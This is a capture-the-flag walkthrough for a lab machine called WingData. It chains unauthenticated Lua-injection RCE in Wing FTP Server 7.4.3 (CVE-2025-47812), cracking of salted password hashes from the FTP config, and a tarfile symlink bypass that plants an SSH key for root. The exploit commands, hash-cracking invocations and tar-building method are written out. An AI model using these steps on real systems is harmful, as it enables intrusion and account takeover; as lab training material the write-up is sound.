Summary

WingData is a Linux box running Apache with a Wing FTP Server v7.4.3 behind a virtual host. The FTP web interface is vulnerable to CVE-2025-47812 (unauthenticated RCE via NULL byte Lua injection), which gives a shell as wingftp. From there, user credentials are extracted from Wing FTP's XML config files and cracked using the application's static salt (WingFTP), yielding SSH access as wacky. Privilege escalation exploits a sudo-permitted Python backup restore script that uses tarfile.extractall(filter="data") — vulnerable to CVE-2025-4138/CVE-2025-4517 (PATH_MAX symlink bypass) — to write an SSH public key to /root/.ssh/authorized_keys.

Virtual Host Discovery

The main site at wingdata.htb is a static corporate page. A "Client Portal" link in the navigation points to ftp.wingdata.htb. Confirmed via vhost fuzzing with ffuf — ftp returned a 404 (distinct from the default 301), indicating a configured vhost:

  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301

echo "10.129.244.106 ftp.wingdata.htb" | sudo tee -a /etc/hosts

Service Identification

Browsing to http://ftp.wingdata.htb/login.html reveals Wing FTP Server v7.4.3 (visible in the page footer). This version is vulnerable to CVE-2025-47812 — unauthenticated RCE.

Foothold — CVE-2025-47812 (Wing FTP Unauthenticated RCE)

Type: Remote, Unauthenticated · CVE: CVE-2025-47812 · Service: Wing FTP Server 7.4.3

How It Works

Wing FTP Server versions ≤ 7.4.3 have a discrepancy between two internal functions:

  1. c_CheckUser() uses strlen() on the username, which truncates at a NULL byte (%00). Authentication passes for the portion before the NULL — in this case, anonymous.
  2. Session file creation uses the full unsanitised username, including everything after the NULL byte.
  3. Since session files are stored as Lua scripts, injecting Lua code after the NULL byte writes executable code into the session file.
  4. When /dir.html is accessed with the resulting session cookie, SessionModule.load() calls loadfile() → f() on the session file, executing the injected Lua code as the wingftp user.

Exploitation

Using the public PoC (Exploit-DB 52347):

python3 CVE-2025-47812.py -u http://ftp.wingdata.htb/ -c "whoami" -v

Output confirms RCE as wingftp. Directory listing of the Wing FTP installation:

Lateral Movement — wingftp → wacky

Credential Discovery

As wingftp, the Wing FTP data directory is readable:

ls /opt/wftpserver/Data/1/users/

anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml

Cross-referencing with system users:

cat /etc/passwd | grep sh$

wacky:x:1001:1001::/home/wacky:/bin/bash

wacky is both a Wing FTP user and a system user with a home directory and bash shell.

Hash Extraction

From wacky.xml:

<UserName>wacky</UserName>
<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>

64-character hex string → SHA-256.

Finding the Salt

Initial attempt to crack as plain SHA-256 (hashcat -m 1400) failed against rockyou.txt. The application's domain settings reveal the salt configuration:

cat /opt/wftpserver/Data/1/settings.xml

<EnablePasswordSalting>1</EnablePasswordSalting>
<SaltingString>WingFTP</SaltingString>

Wing FTP uses a static, hardcoded salt (WingFTP) for all users. The hashing algorithm is SHA256(password + salt).

Cracking

Format the hash file as hash:salt and use hashcat mode 1410 (sha256($pass.$salt)):

printf '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' > hash.txt
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt --force

Or with John the Ripper (uses $ separator):

printf '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca$WingFTP' > john_hash.txt
john --format=dynamic_62 --wordlist=/usr/share/wordlists/rockyou.txt john_hash.txt

Privilege Escalation — CVE-2025-4138 (tarfile PATH_MAX Bypass)

Sudo Permissions

wacky@wingdata:~$ sudo -l

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *

Analysing the Script

cat /opt/backup_clients/restore_backup_clients.py

Key observations:

  • Reads tar files from /opt/backup_clients/backups/
  • Filename must match backup_<digits>.tar
  • Extracts using tarfile.extractall(path=staging_dir, filter="data")
  • The filter="data" is the vulnerable line

Python Version Check

python3 --version
# Python 3.12.3

Python 3.12.3 is vulnerable to CVE-2025-4138/CVE-2025-4517 — a PATH_MAX overflow in os.path.realpath() that bypasses the filter="data" safety check. When the resolved symlink path exceeds 4096 bytes (Linux PATH_MAX), realpath() silently stops resolving and falls back to string manipulation, allowing symlinks to escape the extraction directory.

Exploitation

Step 1 — Generate SSH keypair on the box:

ssh-keygen -t ed25519 -f /tmp/key -N ""

Step 2 — Create malicious tar that writes our public key to root's authorized_keys:

python3 /tmp/exp.py \
  -o /tmp/evil.tar \
  -t /root/.ssh/authorized_keys \
  -p /tmp/key.pub \
  -m 0600

The exploit builds a tar archive with four stages:

  1. Symlink chain — 16 levels of long directories (~247 chars each) with short symlink aliases, inflating the resolved path to ~3968 bytes
  2. Pivot symlink — ../ × 16, causing realpath() to overflow PATH_MAX
  3. Escape symlink — routes through the pivot to /, then to the target directory
  4. Payload file — the SSH public key, written through the escape symlink

Step 3 — Place tar where the script expects it:

cp /tmp/evil.tar /opt/backup_clients/backups/backup_1001.tar

Step 4 — Trigger the extraction as root:

sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py \
  -b backup_1001.tar -r restore_pwned

[+] Backup: backup_1001.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwned
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwned

Step 5 — Copy private key to attacker machine and SSH as root:

# On attacker
scp -i id_rsa wacky@wingdata.htb:/tmp/key ./key
chmod 600 key
ssh -i key root@wingdata.htb

root@wingdata:~# whoami
root
